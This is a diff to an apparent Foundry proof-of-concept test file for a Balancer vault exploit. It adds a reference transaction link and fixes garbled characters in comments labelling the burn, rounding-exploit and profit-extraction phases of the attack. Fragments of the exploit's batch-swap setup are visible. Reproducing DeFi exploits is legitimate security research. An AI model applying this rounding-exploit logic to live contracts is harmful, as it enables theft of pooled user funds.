@@ -37,6 +37,7 @@ contract BalancerPoC is Test {
     }
 }
 
+// @note https://etherscan.io/tx/0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742
 contract BalancerExploit is Test {
     Calculator calculator;
     IBalancerVault public balancerVault;
@@ -132,7 +133,7 @@ contract BalancerExploit is Test {
             memory batchSwapData = new IBalancerVault.BatchSwapStep[](121);
         uint256 swapIndex = 0;
 
-        // ========== PHASE 1: BPT Burn (รท100 progression) ==========
+        // ========== PHASE 1: BPT Burn (100 progression) ==========
         uint256[11] memory phase1Amounts0 = [
             uint256(4873132999218408001625),
             48731329992184080017,
@@ -180,7 +181,7 @@ contract BalancerExploit is Test {
             });
         }
 
-        // ========== PHASE 2: Rounding Exploit (30 iterations ร— 3 swaps) ==========
+        // ========== PHASE 2: Rounding Exploit (30 iterations of 3 swaps) ==========
         {
             uint256[] memory scalingFactorsForCalc = new uint256[](2);
             scalingFactorsForCalc[0] = scalingFactors[0]; // osETH
@@ -307,7 +308,7 @@ contract BalancerExploit is Test {
             }
         }
 
-        // ========== PHASE 3: Profit Extraction (ร—1000 progression) ==========
+        // ========== PHASE 3: Profit Extraction (1000 progression) ==========
         uint256 phase3Amounts = 10000;
 
         for (uint256 i = 0; i < 7; i++) {
